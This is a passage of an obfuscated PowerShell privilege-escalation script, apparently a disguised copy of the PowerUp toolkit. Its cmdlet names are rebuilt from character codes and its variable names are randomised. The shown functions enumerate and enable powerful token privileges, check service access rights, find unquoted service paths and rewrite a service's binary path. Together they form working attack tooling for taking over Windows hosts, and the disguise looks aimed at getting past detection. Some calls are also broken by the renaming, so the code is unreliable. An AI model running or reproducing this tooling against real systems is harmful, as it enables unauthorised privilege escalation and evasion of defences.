                & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lbo)
        }
        elseif ($I2XPx60LSRcn8 -eq 'Privileges') {
            

            
            $cqI7KLDo = 0
            $2MIexk = $m9OcQ7t::GetTokenInformation($fxZOuNsJK, 3, 0, $cqI7KLDo, [ref]$cqI7KLDo)
            [IntPtr]$IKsRfnUH50eu49r3wYJSZa = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($cqI7KLDo)

            $2MIexk = $m9OcQ7t::GetTokenInformation($fxZOuNsJK, 3, $IKsRfnUH50eu49r3wYJSZa, $cqI7KLDo, [ref]$cqI7KLDo);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($2MIexk) {
                $Co6EUnz1mZ = $IKsRfnUH50eu49r3wYJSZa -as $hVrTDW4flQpm0oOG5RL7
                For ($8iqF=0; $8iqF -lt $Co6EUnz1mZ.PrivilegeCount; $8iqF++) {
                    $QImifv0NO8Q = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
                    $QImifv0NO8Q | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Privilege' $Co6EUnz1mZ.Privileges[$8iqF].Luid.LowPart.ToString()
                    
                    $QImifv0NO8Q | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Attributes' ($Co6EUnz1mZ.Privileges[$8iqF].Attributes -as $hJ)
                    $QImifv0NO8Q | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'TokenHandle' $fxZOuNsJK
                    $QImifv0NO8Q.PSObject.TypeNames.Insert(0, 'PowerUp.TokenPrivilege')
                    $QImifv0NO8Q
                }
            }
            else {
                & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($IKsRfnUH50eu49r3wYJSZa)
        }
        else {
            $QHh3xG0byI9vZU6em7E = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject

            

            
            $f0O = 0
            $2MIexk = $m9OcQ7t::GetTokenInformation($fxZOuNsJK, 8, 0, $f0O, [ref]$f0O)
            [IntPtr]$L20uqciDkJOVnEPCYT8 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($f0O)

            $2MIexk = $m9OcQ7t::GetTokenInformation($fxZOuNsJK, 8, $L20uqciDkJOVnEPCYT8, $f0O, [ref]$f0O);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($2MIexk) {
                $oYM = $L20uqciDkJOVnEPCYT8 -as $r5AIfphFtsd9DlQcN
                $QHh3xG0byI9vZU6em7E | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Type' $oYM.Type
            }
            else {
                & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($L20uqciDkJOVnEPCYT8)

            

            
            $oHaOpv7LA8q0flnSbw5V = 0
            $2MIexk = $m9OcQ7t::GetTokenInformation($fxZOuNsJK, 8, 0, $oHaOpv7LA8q0flnSbw5V, [ref]$oHaOpv7LA8q0flnSbw5V)
            [IntPtr]$pUypb = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($oHaOpv7LA8q0flnSbw5V)

            $GDRiiYSyXKTs5sYIB7 = $m9OcQ7t::GetTokenInformation($fxZOuNsJK, 8, $pUypb, $oHaOpv7LA8q0flnSbw5V, [ref]$oHaOpv7LA8q0flnSbw5V);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($GDRiiYSyXKTs5sYIB7) {
                $oYM = $pUypb -as $muoEMHFXG4wV1nbfdv5ZD
                $QHh3xG0byI9vZU6em7E | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ImpersonationLevel' $oYM.ImpersonationLevel
                $QHh3xG0byI9vZU6em7E | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'TokenHandle' $fxZOuNsJK
                $QHh3xG0byI9vZU6em7E.PSObject.TypeNames.Insert(0, 'PowerUp.TokenType')
                $QHh3xG0byI9vZU6em7E
            }
            else {
                & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
            }
            [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pUypb)
        }
    }
}


function Get-ProcessTokenGroup {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $q5wMHUAIPesx9Kt1iTm8fn
    )

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $pdU36FBy = $NV3dxzM2::OpenProcess(0x400, $False, $q5wMHUAIPesx9Kt1iTm8fn);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($pdU36FBy -eq 0) {
                & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
            }
            else {
                $NYhzxH5co6vk9RAQg8UyGs = $q5wMHUAIPesx9Kt1iTm8fn
            }
        }
        else {
            
            $pdU36FBy = $NV3dxzM2::GetCurrentProcess()
            $NYhzxH5co6vk9RAQg8UyGs = $PID
        }

        if ($pdU36FBy) {
            [IntPtr]$i1MwJxAdk3qnRaHy674 = [IntPtr]::Zero
            $5EVUpIN2mn67jbG = 0x0008
            $2MIexk = $m9OcQ7t::OpenProcessToken($pdU36FBy, $5EVUpIN2mn67jbG, [ref]$i1MwJxAdk3qnRaHy674);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($2MIexk) {
                $XdNqZ = Get-TokenInformation -fxZOuNsJK $i1MwJxAdk3qnRaHy674 -I2XPx60LSRcn8 'Groups'
                $XdNqZ | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
                    $_ | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ProcessId' $NYhzxH5co6vk9RAQg8UyGs
                    $_
                }
            }
            else {
                & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
            }

            if ($PSBoundParameters['Id']) {
                
                $BpZKcilASnhDR0mHwzFy = $NV3dxzM2::CloseHandle($pdU36FBy)
            }
        }
    }
}


function Get-ProcessTokenPrivilege {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenPrivilege')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $q5wMHUAIPesx9Kt1iTm8fn,

        [Switch]
        [Alias('Privileged')]
        $1fMl18mNKjRq3g
    )

    BEGIN {
        $5o = @('SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeDebugPrivilege', 'SeSystemEnvironmentPrivilege', 'SeImpersonatePrivilege', 'SeTcbPrivilege')
    }

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $pdU36FBy = $NV3dxzM2::OpenProcess(0x400, $False, $q5wMHUAIPesx9Kt1iTm8fn);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($pdU36FBy -eq 0) {
                & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
            }
            else {
                $NYhzxH5co6vk9RAQg8UyGs = $q5wMHUAIPesx9Kt1iTm8fn
            }
        }
        else {
            
            $pdU36FBy = $NV3dxzM2::GetCurrentProcess()
            $NYhzxH5co6vk9RAQg8UyGs = $PID
        }

        if ($pdU36FBy) {
            [IntPtr]$i1MwJxAdk3qnRaHy674 = [IntPtr]::Zero
            $5EVUpIN2mn67jbG = 0x0008
            $2MIexk = $m9OcQ7t::OpenProcessToken($pdU36FBy, $5EVUpIN2mn67jbG, [ref]$i1MwJxAdk3qnRaHy674);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($2MIexk) {
                Get-TokenInformation -fxZOuNsJK $i1MwJxAdk3qnRaHy674 -I2XPx60LSRcn8 'Privileges' | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
                    if ($PSBoundParameters['Special']) {
                        if ($5o -Contains $_.Privilege) {
                            $_ | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ProcessId' $NYhzxH5co6vk9RAQg8UyGs
                            $_ | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Aliasproperty Name ProcessId
                            $_
                        }
                    }
                    else {
                        $_ | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ProcessId' $NYhzxH5co6vk9RAQg8UyGs
                        $_
                    }
                }
            }
            else {
                & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
            }

            if ($PSBoundParameters['Id']) {
                
                $BpZKcilASnhDR0mHwzFy = $NV3dxzM2::CloseHandle($pdU36FBy)
            }
        }
    }
}


function Get-ProcessTokenType {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.TokenType')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessID')]
        [UInt32]
        [ValidateNotNullOrEmpty()]
        $q5wMHUAIPesx9Kt1iTm8fn
    )

    PROCESS {
        if ($PSBoundParameters['Id']) {
            $pdU36FBy = $NV3dxzM2::OpenProcess(0x400, $False, $q5wMHUAIPesx9Kt1iTm8fn);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if ($pdU36FBy -eq 0) {
                & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
            }
            else {
                $NYhzxH5co6vk9RAQg8UyGs = $q5wMHUAIPesx9Kt1iTm8fn
            }
        }
        else {
            
            $pdU36FBy = $NV3dxzM2::GetCurrentProcess()
            $NYhzxH5co6vk9RAQg8UyGs = $PID
        }

        if ($pdU36FBy) {
            [IntPtr]$i1MwJxAdk3qnRaHy674 = [IntPtr]::Zero
            $5EVUpIN2mn67jbG = 0x0008
            $2MIexk = $m9OcQ7t::OpenProcessToken($pdU36FBy, $5EVUpIN2mn67jbG, [ref]$i1MwJxAdk3qnRaHy674);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

            if ($2MIexk) {
                $u2xARTNDLvnHUlBZi0k1tGf = Get-TokenInformation -fxZOuNsJK $i1MwJxAdk3qnRaHy674 -I2XPx60LSRcn8 'Type'
                $u2xARTNDLvnHUlBZi0k1tGf | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
                    $_ | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ProcessId' $NYhzxH5co6vk9RAQg8UyGs
                    $_
                }
            }
            else {
                & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
            }

            if ($PSBoundParameters['Id']) {
                
                $BpZKcilASnhDR0mHwzFy = $NV3dxzM2::CloseHandle($pdU36FBy)
            }
        }
    }
}


function Enable-Privilege {


    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Privileges')]
        [ValidateSet('SeCreateTokenPrivilege', 'SeAssignPrimaryTokenPrivilege', 'SeLockMemoryPrivilege', 'SeIncreaseQuotaPrivilege', 'SeUnsolicitedInputPrivilege', 'SeMachineAccountPrivilege', 'SeTcbPrivilege', 'SeSecurityPrivilege', 'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeSystemProfilePrivilege', 'SeSystemtimePrivilege', 'SeProfileSingleProcessPrivilege', 'SeIncreaseBasePriorityPrivilege', 'SeCreatePagefilePrivilege', 'SeCreatePermanentPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege', 'SeShutdownPrivilege', 'SeDebugPrivilege', 'SeAuditPrivilege', 'SeSystemEnvironmentPrivilege', 'SeChangeNotifyPrivilege', 'SeRemoteShutdownPrivilege', 'SeUndockPrivilege', 'SeSyncAgentPrivilege', 'SeEnableDelegationPrivilege', 'SeManageVolumePrivilege', 'SeImpersonatePrivilege', 'SeCreateGlobalPrivilege', 'SeTrustedCredManAccessPrivilege', 'SeRelabelPrivilege', 'SeIncreaseWorkingSetPrivilege', 'SeTimeZonePrivilege', 'SeCreateSymbolicLinkPrivilege')]
        [String[]]
        $QImifv0NO8Q
    )

    PROCESS {
        ForEach ($GYegh0OwCoTMKikArZb1aEX3N in $QImifv0NO8Q) {
            [UInt32]$77E7Z = 0
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Attempting to enable $GYegh0OwCoTMKikArZb1aEX3N"
            $2MIexk = $o4EQcXi9sW1VsyIMXiUCj3::RtlAdjustPrivilege($CkFo7Y::$GYegh0OwCoTMKikArZb1aEX3N, $True, $False, [ref]$77E7Z)
            if ($2MIexk -ne 0) {
                & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) "RtlAdjustPrivilege for $GYegh0OwCoTMKikArZb1aEX3N failed: $2MIexk"
            }
        }
    }
}


function Add-ServiceDacl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('ServiceProcess.ServiceController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $7GFj6Vi5MUh9X
    )

    BEGIN {
        filter Local:Get-ServiceReadControlHandle {
            [OutputType([IntPtr])]
            Param(
                [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
                [ValidateNotNullOrEmpty()]
                [ValidateScript({ $_ -as 'ServiceProcess.ServiceController' })]
                $Mb58kYmonUGrhQ
            )

            $4crNAR = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
            $WOLg7ImywHihco2lsouH = 0x00020000
            $2yxQrITYR = $4crNAR.Invoke($Mb58kYmonUGrhQ, @($WOLg7ImywHihco2lsouH))
            $2yxQrITYR
        }
    }

    PROCESS {
        ForEach($jPMDgGwdyrFuXif in $7GFj6Vi5MUh9X) {

            $abep4F = Get-Service -7GFj6Vi5MUh9X $jPMDgGwdyrFuXif -ErrorAction Stop

            try {
                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Add-ServiceDacl IndividualService : $($abep4F.Name)"
                $ServiceHandleTw2Eaj = Get-ServiceReadControlHandle -Service $abep4F
            }
            catch {
                $ServiceHandleTw2Eaj = $BpZKcilASnhDR0mHwzFy
                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Error opening up the service handle with read control for $($abep4F.Name) : $_"
            }

            if ($ServiceHandleTw2Eaj -and ($ServiceHandleTw2Eaj -ne [IntPtr]::Zero)) {
                $osmdklxWU6Iaq5G3nrQLf = 0

                $U51iWlcYNSdtn0ML7 = $m9OcQ7t::QueryServiceObjectSecurity($ServiceHandleTw2Eaj, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, @(), 0, [Ref] $osmdklxWU6Iaq5G3nrQLf);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                
                if ((-not $U51iWlcYNSdtn0ML7) -and ($orOtbI -eq 122) -and ($osmdklxWU6Iaq5G3nrQLf -gt 0)) {
                    $YFSFoug9ZXUMdbxga2ZYb09 = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) Byte[]($osmdklxWU6Iaq5G3nrQLf)

                    $U51iWlcYNSdtn0ML7 = $m9OcQ7t::QueryServiceObjectSecurity($ServiceHandleTw2Eaj, [Security.AccessControl.SecurityInfos]::DiscretionaryAcl, $YFSFoug9ZXUMdbxga2ZYb09, $YFSFoug9ZXUMdbxga2ZYb09.Count, [Ref] $osmdklxWU6Iaq5G3nrQLf);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (-not $U51iWlcYNSdtn0ML7) {
                        & ([string]::join('', ( (87,114,105,116,101,45,69,114,114,111,114) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
                    }
                    else {
                        $fPeQgj1pSAVDLwYm = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) Security.AccessControl.RawSecurityDescriptor -ArgumentList $YFSFoug9ZXUMdbxga2ZYb09, 0
                        $ixdZgSKChLmHW3a6E7srBOn = $fPeQgj1pSAVDLwYm.DiscretionaryAcl | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
                            & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) -InputObject $_ -MemberType NoteProperty -7GFj6Vi5MUh9X AccessRights -Value ($_.AccessMask -as $JL2PUqKoXxHMEVw0N) -PassThru
                        }
                        & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) -InputObject $abep4F -MemberType NoteProperty -7GFj6Vi5MUh9X Dacl -Value $ixdZgSKChLmHW3a6E7srBOn -PassThru
                    }
                }
                else {
                    & ([string]::join('', ( (87,114,105,116,101,45,69,114,114,111,114) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
                }
                $BpZKcilASnhDR0mHwzFy = $m9OcQ7t::CloseServiceHandle($ServiceHandleTw2Eaj)
            }
        }
    }
}


function Set-ServiceBinaryPath {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $7GFj6Vi5MUh9X,

        [Parameter(Position=1, Mandatory = $True)]
        [Alias('BinaryPath', 'binPath')]
        [String]
        [ValidateNotNullOrEmpty()]
        $b3CtzFF8zYowylvWrqwrJZd
    )

    BEGIN {
        filter Local:Get-ServiceConfigControlHandle {
            [OutputType([IntPtr])]
            Param(
                [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
                [ServiceProcess.ServiceController]
                [ValidateNotNullOrEmpty()]
                $jcEgpX
            )
            $4crNAR = [ServiceProcess.ServiceController].GetMethod('GetServiceHandle', [Reflection.BindingFlags] 'Instance, NonPublic')
            $1AiBufFmGSjb2wHP = 0x00000002
            $2yxQrITYR = $4crNAR.Invoke($jcEgpX, @($1AiBufFmGSjb2wHP))
            $2yxQrITYR
        }
    }

    PROCESS {

        ForEach($abep4F in $7GFj6Vi5MUh9X) {

            $jcEgpX = Get-Service -7GFj6Vi5MUh9X $abep4F -ErrorAction Stop
            try {
                $ServiceHandleTw2Eaj = Get-ServiceConfigControlHandle -TargetService $jcEgpX
            }
            catch {
                $ServiceHandleTw2Eaj = $BpZKcilASnhDR0mHwzFy
                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Error opening up the service handle with read control for $abep4F : $_"
            }

            if ($ServiceHandleTw2Eaj -and ($ServiceHandleTw2Eaj -ne [IntPtr]::Zero)) {

                $lx9SL7Wc = [UInt32]::MaxValue
                $U51iWlcYNSdtn0ML7 = $m9OcQ7t::ChangeServiceConfig($ServiceHandleTw2Eaj, $lx9SL7Wc, $lx9SL7Wc, $lx9SL7Wc, "$b3CtzFF8zYowylvWrqwrJZd", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$orOtbI = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                if ($U51iWlcYNSdtn0ML7 -ne 0) {
                    & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "binPath for $abep4F successfully set to '$b3CtzFF8zYowylvWrqwrJZd'"
                    $True
                }
                else {
                    & ([string]::join('', ( (87,114,105,116,101,45,69,114,114,111,114) |%{ ( [char][int] $_)})) | % {$_}) ([ComponentModel.Win32Exception] $orOtbI)
                    $BpZKcilASnhDR0mHwzFy
                }

                $BpZKcilASnhDR0mHwzFy = $m9OcQ7t::CloseServiceHandle($ServiceHandleTw2Eaj)
            }
        }
    }
}


function Test-ServiceDaclPermission {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('ServiceProcess.ServiceController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName', 'Service')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $7GFj6Vi5MUh9X,

        [String[]]
        [ValidateSet('QueryConfig', 'ChangeConfig', 'QueryStatus', 'EnumerateDependents', 'Start', 'Stop', 'PauseContinue', 'Interrogate', 'UserDefinedControl', 'Delete', 'ReadControl', 'WriteDac', 'WriteOwner', 'Synchronize', 'AccessSystemSecurity', 'GenericAll', 'GenericExecute', 'GenericWrite', 'GenericRead', 'AllAccess')]
        $M9b0cVwaSTxmLWUhv52N78rX,

        [String]
        [ValidateSet('ChangeConfig', 'Restart', 'AllAccess')]
        $H0zpm3lIZ2L = 'ChangeConfig'
    )

    BEGIN {
        $Ghyotkw = @{
            'QueryConfig'           = [uint32]'0x00000001'
            'ChangeConfig'          = [uint32]'0x00000002'
            'QueryStatus'           = [uint32]'0x00000004'
            'EnumerateDependents'   = [uint32]'0x00000008'
            'Start'                 = [uint32]'0x00000010'
            'Stop'                  = [uint32]'0x00000020'
            'PauseContinue'         = [uint32]'0x00000040'
            'Interrogate'           = [uint32]'0x00000080'
            'UserDefinedControl'    = [uint32]'0x00000100'
            'Delete'                = [uint32]'0x00010000'
            'ReadControl'           = [uint32]'0x00020000'
            'WriteDac'              = [uint32]'0x00040000'
            'WriteOwner'            = [uint32]'0x00080000'
            'Synchronize'           = [uint32]'0x00100000'
            'AccessSystemSecurity'  = [uint32]'0x01000000'
            'GenericAll'            = [uint32]'0x10000000'
            'GenericExecute'        = [uint32]'0x20000000'
            'GenericWrite'          = [uint32]'0x40000000'
            'GenericRead'           = [uint32]'0x80000000'
            'AllAccess'             = [uint32]'0x000F01FF'
        }

        $lYFqE0guAz = $False

        if ($PSBoundParameters['Permissions']) {
            $aqSvwVEAd6iNp1KPjtBQH = $M9b0cVwaSTxmLWUhv52N78rX
        }
        else {
            if ($H0zpm3lIZ2L -eq 'ChangeConfig') {
                $aqSvwVEAd6iNp1KPjtBQH = @('ChangeConfig', 'WriteDac', 'WriteOwner', 'GenericAll', ' GenericWrite', 'AllAccess')
            }
            elseif ($H0zpm3lIZ2L -eq 'Restart') {
                $aqSvwVEAd6iNp1KPjtBQH = @('Start', 'Stop')
                $lYFqE0guAz = $True 
            }
            elseif ($H0zpm3lIZ2L -eq 'AllAccess') {
                $aqSvwVEAd6iNp1KPjtBQH = @('GenericAll', 'AllAccess')
            }
        }
    }

    PROCESS {

        ForEach($abep4F in $7GFj6Vi5MUh9X) {

            $jcEgpX = $abep4F | Add-ServiceDacl

            if ($jcEgpX -and $jcEgpX.Dacl) {

                
                $4Qerja = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $G0 = $4Qerja.Groups | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty Value
                $G0 += $4Qerja.User.Value

                ForEach($yUFtqLBH0TKpGWVx in $jcEgpX.Dacl) {
                    if ($G0 -contains $yUFtqLBH0TKpGWVx.SecurityIdentifier) {

                        if ($lYFqE0guAz) {
                            $59Q6M = $True
                            ForEach($Icw5 in $aqSvwVEAd6iNp1KPjtBQH) {
                                
                                if (($yUFtqLBH0TKpGWVx.AccessRights -band $Ghyotkw[$Icw5]) -ne $Ghyotkw[$Icw5]) {
                                    
                                    $59Q6M = $False
                                    break
                                }
                            }
                            if ($59Q6M) {
                                $jcEgpX
                            }
                        }
                        else {
                            ForEach($Icw5 in $aqSvwVEAd6iNp1KPjtBQH) {
                                
                                if (($yUFtqLBH0TKpGWVx.AceType -eq 'AccessAllowed') -and ($yUFtqLBH0TKpGWVx.AccessRights -band $Ghyotkw[$Icw5]) -eq $Ghyotkw[$Icw5]) {
                                    & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Current user has '$Icw5' for $abep4F"
                                    $jcEgpX
                                    break
                                }
                            }
                        }
                    }
                }
            }
            else {
                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Error enumerating the Dacl for service $abep4F"
            }
        }
    }
}








function Get-UnquotedService {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.UnquotedService')]
    [CmdletBinding()]
    Param()

    
    $NdY7vzqwPZBMTxUWOa8 = Get-WmiObject -Class win32_service | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {
        $_ -and ($BpZKcilASnhDR0mHwzFy -ne $_.pathname) -and ($_.pathname.Trim() -ne '') -and (-not $_.pathname.StartsWith("`"")) -and (-not $_.pathname.StartsWith("'")) -and ($_.pathname.Substring(0, $_.pathname.ToLower().IndexOf('.exe') + 4)) -match '.* .*'
    }

    if ($NdY7vzqwPZBMTxUWOa8) {
        ForEach ($Mb58kYmonUGrhQ in $NdY7vzqwPZBMTxUWOa8) {

            $SplitPathArraycJWC79wugSLhtxKb3nf = $Mb58kYmonUGrhQ.pathname.Split(' ')
            $xwZ = @()
            for ($8iqF=0;$8iqF -lt $SplitPathArraycJWC79wugSLhtxKb3nf.Count; $8iqF++) {
                        $xwZ += $SplitPathArraycJWC79wugSLhtxKb3nf[0..$8iqF] -join ' '
            }

            $Qj = $xwZ | Get-ModifiablePath

            $Qj | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_ -and $_.ModifiablePath -and ($_.ModifiablePath -ne '')} | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
                $CanRestartzeCYZgqvz3AZIv = Test-ServiceDaclPermission -H0zpm3lIZ2L 'Restart' -7GFj6Vi5MUh9X $Mb58kYmonUGrhQ.name
                $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ServiceName' $Mb58kYmonUGrhQ.name
